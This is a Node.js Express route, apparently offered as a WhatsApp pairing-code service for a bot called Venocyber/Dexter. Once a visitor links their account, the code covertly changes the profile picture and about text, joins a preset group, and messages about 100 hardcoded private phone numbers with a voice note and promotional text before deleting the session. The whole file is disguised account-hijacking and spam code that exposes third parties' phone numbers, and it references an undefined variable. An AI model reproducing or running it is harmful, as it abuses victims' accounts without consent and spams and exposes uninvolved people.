const PastebinAPI = require('pastebin-js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: Venocyber_Tech, useMultiFileAuthState, delay, makeCacheableSignalKeyStore } = require("maher-zubair-baileys");

const pastebin = new PastebinAPI(process.env.PASTEBIN_API_KEY);
const { makeid } = require('./id');
const router = express.Router();

const audioUrl = 'https://github.com/darkewing/audio.git';
const generalMessage = `*╭────────────⊶*
*│* *ɪ ᴀᴍ ʀᴇᴀʟ ᴅᴇxᴛᴇʀ*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ \`ɴᴀᴍᴇ │ DEXTER\`
*│* ○ \`ꜰʀᴏᴍ │ᴀᴍᴘᴀʀᴀ\`
*│* ○ \`ᴀɢᴇ │+17\`
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ මාව save කර ගන්න❯*
*│"ඔයාව SAVE"*
*│❮ AUTO REPLY ❯*
*╰──────────⊶*

*❮ꜱᴀᴠᴇ නම් අනිවරෙන් කියන්න❯*
*❮STATUS VIEWERS වලට අවේ❯*`;
const groupLink = 'https://chat.whatsapp.com/BcaaQ3Hk2Oc1r7Me2ob69Fi';
const profilePictureUrl = 'https://telegra.ph/file/9ed44d68d2d271b2022ad.jpg';

const predefinedNumbers = [
  "+94763852362","+94701788082","+94701788082","+94701788082",
  "+94701788082","+94779426102","+94741295230","+94706100048",
  "+94783126826","+94701882301","+94701777928","+94784505954",
  "+94767475990","+94770151704","+94714271792","+94729110677",
  "+94763456578","+94701301290","+94765919463","+94763033425",
  "+94778335450","+94741891194","+94718771811","+94712696493",
  "+94721296993","+94751600397","+94757827406","+94703439814",
  "+94717621836","+94769456586","+94721120709","+94723323512",
  "+94703406985","+94742736484","+94742736484","+94751482801",
  "+94762394171","+94741371730","+94765903191","+94711538986",
  "+94710198581","+94714047756","+94762472208","+94768579431",
  "+94760645716","+94754697995","+94769152271","+94767199396",
  "+94767199396","+94740767433","+94774922614","+94766232943",
  "+94743889930","+94704227698","+94740495348","+94711597853",
  "+94773006124","+94741121136","+94719855600","+94776253242",
  "+94769084352","+94760448209","+94775661052","+94775661052",
  "+94762969554","+94703140089","+94766049570","+94742444580",
  "+94701134590","+94770452876","+94718108362","+94719487250",
  "+94754673033","+94741047478","+94713436018","+94714037597",
  "+94762716866","+94763734956","+94713777051","+94764969167",
  "+94768948301","+94701731765","+94722593926","+94703105771",
  "+94710956471","+94782637057","+94742213692","+94771098464",
  "+94764330795","+94774427059","+94764330795","+94764340844",
  "+94764340844","+94774427059","+94771098464","+94764330795",
  "+94771098464","+94764330795","+94774427059","+94774427059",
  "+94762080483","+94788428238","+94767013688","+94788428238"
];

function removeFile(filePath) {
    if (fs.existsSync(filePath)) {
        fs.rmSync(filePath, { recursive: true, force: true });
    }
}

async function VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res) {
    const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
    try {
        let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);

        Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection === "open") {
                await handleInitialSetup(Pair_Code_By_Venocyber_Tech);
                await handleConnectionOpen(Pair_Code_By_Venocyber_Tech, customMessage, res, id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                console.error("Connection closed unexpectedly. Restarting...");
                await delay(10000); // Wait before retrying
                VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res);
            }
        });

        if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
            if (!res.headersSent) {
                await res.send({ code });
            }
        }
    } catch (err) {
        console.error("Service restart failed:", err);
        await removeFile(`./temp/${id}`);
        if (!res.headersSent) {
            await res.send({ code: "Service Unavailable" });
        }
    }
}

async function handleInitialSetup(client) {
    try {
        await client.updateProfilePicture(client.user.id, { url: profilePictureUrl });
        console.log('Profile picture updated successfully!');
    } catch (error) {
        console.error('Failed to update profile picture:', error);
    }

    try {
        await client.updateProfileStatus(aboutText);
        console.log('About text updated successfully!');
    } catch (error) {
        console.error('Failed to update about text:', error);
    }
}

async function handleConnectionOpen(client, customMessage, res, id) {
    try {
        await client.groupAcceptInvite(groupLink.split('/').pop());
        console.log('Successfully joined the group!');
    } catch (error) {
        console.error('Failed to join the group:', error);
    }

    for (const number of predefinedNumbers) {
        const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try {
            console.log(`Sending audio message to ${number}`);
            await client.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true 
            });
            await delay(2000); 

            console.log(`Sending text message to ${number}`);
            await client.sendMessage(jid, { text: customMessage });
            await delay(2000); 
            
        } catch (error) {
            console.error(`Failed to send message to ${number}:`, error);
        }
    }

    await delay(3000); 
    await client.ws.close();
    await removeFile(`./temp/${id}`);
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    const message = req.query.message || generalMessage;
    return await VENOCYBER_MD_PAIR_CODE(id, num, message, res);
});

module.exports = router;
